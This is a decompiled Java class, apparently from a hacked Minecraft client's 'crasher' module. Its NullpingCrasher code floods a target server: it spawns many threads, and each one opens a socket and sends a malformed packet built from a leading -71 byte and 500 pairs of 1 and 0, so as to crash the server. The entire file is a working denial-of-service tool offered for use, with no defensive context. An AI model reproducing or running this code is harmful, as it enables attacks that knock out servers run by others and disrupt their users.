// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import java.io.IOException;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class NullpingCrasher
{
    public static int threads;
    
    static {
        NullpingCrasher.threads = 0;
    }
    
    public static void pingThreadCrasher(final String host, final int port, final int maxThreads, long time) {
        time = TimeUnit.SECONDS.toMillis(time);
        final long time2 = System.currentTimeMillis();
        do {
            if (NullpingCrasher.threads < maxThreads) {
                new Thread() {
                    @Override
                    public void run() {
                        ++NullpingCrasher.threads;
                        try {
                            NullpingCrasher.ping(host, port);
                        }
                        catch (final Exception ex) {}
                        --NullpingCrasher.threads;
                    }
                }.start();
            }
            try {
                Thread.sleep(1L);
            }
            catch (final InterruptedException ex) {}
        } while (System.currentTimeMillis() - time2 < time);
    }
    
    public static void ping(final String host, final int port) throws IOException {
        final Socket socket = new Socket(host, port);
        final DataOutputStream out = new DataOutputStream(socket.getOutputStream());
        out.write(-71);
        for (int i = 0; i < 500; ++i) {
            out.write(1);
            out.write(0);
        }
    }
}
